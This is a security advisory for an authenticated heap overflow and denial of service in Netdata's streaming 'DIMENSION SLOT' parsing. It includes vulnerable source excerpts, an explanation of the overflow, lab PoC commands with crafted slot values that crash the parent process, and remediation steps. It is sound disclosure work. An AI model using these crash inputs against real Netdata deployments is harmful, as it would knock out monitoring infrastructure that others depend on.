# Authenticated Remote Heap Corruption in Netdata Streaming `DIMENSION SLOT`

## Summary

A malicious or compromised Netdata streaming child with a valid streaming API key can send a malformed `DIMENSION SLOT:<value>` command that makes the parent allocate an undersized dimension-cache array and then write past the end of that allocation.

Validated impact:

- Authenticated remote heap-buffer-overflow in the parent Netdata Agent.
- Authenticated remote parent-process crash / denial of service.
- Plausible RCE potential due to heap corruption, but reliable end-to-end RCE has not been proven.

The issue is in the PLUGINSD streaming receive path. The vulnerable parent trusts a child-provided slot number as an allocation count without applying a dimension-slot upper bound or checked allocation arithmetic.

## Details

### Affected Code

The vulnerable flow is:

1. `src/plugins.d/pluginsd_internals.h:372` parses the optional `SLOT:` value.
2. `src/plugins.d/pluginsd_parser.c:572` passes the parsed value into the `DIMENSION` cache update path.
3. `src/plugins.d/pluginsd_internals.h:159` uses the slot as the wanted dimension-cache size.
4. `src/database/rrdset-pluginsd-array.h:51` allocates `sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim)` without checking overflow.

Relevant source snippets:

```c
// src/plugins.d/pluginsd_internals.h
static ALWAYS_INLINE ssize_t pluginsd_parse_rrd_slot(char **words, size_t num_words) {
    ssize_t slot = -1;
    char *id = get_word(words, num_words, 1);
    if(id && id[0] == PLUGINSD_KEYWORD_SLOT[0] && id[1] == PLUGINSD_KEYWORD_SLOT[1] &&
       id[2] == PLUGINSD_KEYWORD_SLOT[2] && id[3] == PLUGINSD_KEYWORD_SLOT[3] && id[4] == ':') {
        slot = (ssize_t) str2ull_encoded(&id[5]);
        if(slot < 0) slot = 0;
    }

    return slot;
}
```

```c
// src/plugins.d/pluginsd_internals.h
static inline void pluginsd_rrddim_put_to_slot(PARSER *parser, RRDSET *st, RRDDIM *rd, ssize_t slot, bool obsolete)  {
    size_t wanted_size;

    if(slot >= 1) {
        st->pluginsd.dims_with_slots = true;
        wanted_size = (size_t)slot;
    }
    else {
        st->pluginsd.dims_with_slots = false;
        wanted_size = dictionary_entries(st->rrddim_root_index);
    }

    PRD_ARRAY *current_arr = prd_array_get_unsafe(&st->pluginsd.prd_array);
    size_t current_size = current_arr ? current_arr->size : 0;

    if(wanted_size > current_size) {
        PRD_ARRAY *new_arr = prd_array_create(wanted_size);
        ...
        for(size_t i = current_size; i < wanted_size; i++) {
            new_arr->entries[i].rda = NULL;
            new_arr->entries[i].rd = NULL;
            new_arr->entries[i].id = NULL;
        }
        ...
        PRD_ARRAY *old_arr = prd_array_replace(&st->pluginsd.prd_array, new_arr);
    }
}
```

```c
// src/database/rrdset-pluginsd-array.h
static inline PRD_ARRAY *prd_array_create(size_t size) {
    PRD_ARRAY *arr = callocz(1, sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim));
    arr->refcount = 1;
    arr->size = size;
    rrd_slot_memory_added(sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim));
    return arr;
}
```

### How It Works Step By Step

| Step | What happens |
|---|---|
| 1 | A streaming peer with valid credentials sends a `DIMENSION SLOT:<very-large-value>` command. |
| 2 | The parent parses the slot and uses it as the requested PRD dimension-cache size. |
| 3 | `size * sizeof(struct pluginsd_rrddim)` overflows `size_t`, so `callocz()` allocates a tiny buffer. |
| 4 | `prd_array_create()` stores the original huge logical size in `arr->size`. |
| 5 | Before the array is published to `st->pluginsd.prd_array`, the grow path initializes entries from `current_size` to `wanted_size`. |
| 6 | That initialization loop writes past the tiny allocation, corrupting adjacent heap memory and usually crashing the parent. |
| 7 | The later bounds check `slot <= arr->size` would permit small in-range slot updates only if a corrupted huge logical array became reachable. That condition was simulated in standalone PoCs but not demonstrated against the real running Netdata control flow. |

Key correction: storing a huge `arr->size` does not by itself prove the later controlled-write path is reachable in production, because the real code runs the initialization loop before publishing the new array.

### Validated Versus Unproven Impact

Validated:

- A malformed slot can make allocation arithmetic wrap.
- The parent can allocate a tiny `PRD_ARRAY` and then perform attacker-sized sequential out-of-bounds writes.
- The parent can crash through heap corruption.
- Large non-overflowing slot values can also cause fatal allocation failure.

Not proven:

- No live remote RCE against a running Netdata parent was demonstrated.
- Heap grooming through the streaming protocol was not demonstrated against the real allocator.
- The init-loop crash versus controlled-write timing problem was not solved in a live environment.
- ASLR bypass was not demonstrated.
- The available write primitive writes Netdata/heap pointers or NULL pointer fields, not arbitrary attacker-chosen absolute addresses.

## PoC

Use an isolated lab only. Do not run these steps against production parents, shared environments, or systems you do not own.

### Prerequisites

- Vulnerable Netdata source checkout at the affected commit or branch.
- `gcc` available for standalone harnesses.
- Optional: an ASan-capable compiler for memory-safety evidence.
- For the network-level lab reproduction only:
  - a local Netdata parent bound to loopback;
  - a throwaway streaming API key generated for the lab;
  - parent `stream.conf` allowing only loopback for that key.

### Option A: Standalone Arithmetic Regression

This confirms the vulnerable slot classes without starting Netdata or using the network.

```bash
mkdir -p .local/audits/dimension-slot-overflow

gcc -O0 -g \
  -x c \
  -o .local/audits/dimension-slot-overflow/test_slot_overflow_regression \
  <(git show origin/security/dimension-slot-overflow-v2:security-audit/test_slot_overflow_regression.c)

.local/audits/dimension-slot-overflow/test_slot_overflow_regression
```

Expected result:

- overflow-class slot values are detected;
- large non-overflowing resource-exhaustion slot values are detected;
- normal small slot values remain valid.

### Option B: Standalone ASan Heap-Overflow Reproduction

This confirms the memory-safety issue in a local model of the PRD allocation and initialization loop.

```bash
mkdir -p .local/audits/dimension-slot-overflow

gcc -O0 -g -fsanitize=address \
  -o .local/audits/dimension-slot-overflow/poc_prd_overflow_asan \
  security-audit/poc_prd_overflow.c

.local/audits/dimension-slot-overflow/poc_prd_overflow_asan 0x0AAAAAAAAAAAAAAB
```

Expected indicator:

```text
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
```

The stack should point into the local model of `prd_array_create()` and the `pluginsd_rrddim_put_to_slot()` initialization loop.

### Option C: Isolated Loopback Streaming Crash Reproduction

This demonstrates real parent-process impact in a lab. Keep the parent bound to loopback and use a throwaway API key.

1. Generate a lab-only streaming API key:

   ```bash
   export LAB_STREAMING_API_KEY="$(uuidgen)"
   ```

2. Configure the lab parent stream receiver with the generated key. The committed report uses a placeholder; write the actual key only into your local, uncommitted lab config:

   ```text
   [${LAB_STREAMING_API_KEY}]
       type = api
       enabled = yes
       allow from = 127.0.0.1
   ```

3. Start the vulnerable parent in the lab with streaming enabled and reachable only on loopback.

4. From the same lab host, run the streaming PoC against loopback:

   ```bash
   python3 security-audit/poc_stream_dimension_slot.py \
     127.0.0.1 \
     19999 \
     "${LAB_STREAMING_API_KEY}" \
     0x0AAAAAAAAAAAAAAB
   ```

5. Observe the parent process.

Expected indicators:

- ASan lab build:

  ```text
  ERROR: AddressSanitizer: heap-buffer-overflow
  WRITE of size 8
  ```

- Non-ASan lab build:

  ```text
  Segmentation fault
  malloc(): corrupted top size
  corrupted size vs. prev_size
  free(): invalid next size
  ```

- systemd-managed parent:

  ```bash
  journalctl -u netdata --since "15 minutes ago"
  coredumpctl list netdata
  ```

Suspicious stack frames include:

- `prd_array_create`
- `pluginsd_rrddim_put_to_slot`
- `pluginsd_dimension`
- PLUGINSD parser / streaming receiver frames

### Alternate DoS Class: Large Non-Overflowing Slot

The overflow is not the only crash class. A large non-overflowing slot can request a very large allocation. Netdata allocation helpers call `fatal()` on allocation failure, terminating the parent.

Use this only in a local lab:

```bash
python3 security-audit/poc_stream_dimension_slot.py \
  127.0.0.1 \
  19999 \
  "${LAB_STREAMING_API_KEY}" \
  0x40000000
```

Expected result:

- parent exits due to fatal allocation failure or is terminated by the environment under memory pressure.

## Impact

This is an authenticated remote memory-safety vulnerability in the Netdata parent streaming receive path.

Who is impacted:

- Netdata parent-child deployments with streaming receive enabled.
- Parent agents that accept streams from children using shared or per-child API keys.
- Environments where a child host can be compromised, an insider has a valid streaming key, or an overly broad `allow from` policy permits untrusted children to connect.

Operational impact:

- Parent `netdata` process crash.
- Streaming children appear stale, offline, or disconnected.
- Parent dashboards show metric gaps around the crash time.
- Alert evaluation may flap, go stale, or stop until the parent restarts and children reconnect.
- If supervised by systemd or another service manager, the parent may enter a repeated restart loop while the malicious child reconnects.

Severity guidance:

- Confidentiality: not proven.
- Integrity: not proven for reliable code execution, but heap corruption exists.
- Availability: high; parent-process crash is reproducible in lab conditions.

Recommended classification:

```text
Authenticated remote heap corruption and parent-process DoS in Netdata streaming DIMENSION SLOT handling, with plausible but unproven RCE potential.
```

## Recommended Remediation

1. Reject invalid and oversized dimension slots before any allocation or indexing.
2. Add checked multiplication and addition in `prd_array_create()`.
3. Apply a resource cap to both dimension slots and chart slots; the chart-slot path already rejects `slot >= INT32_MAX`, but large values below that can still force excessive allocation.
4. Add regression coverage for:
   - overflow-class slots;
   - large non-overflowing allocation-failure slots;
   - zero and clamped values;
   - normal small slots.
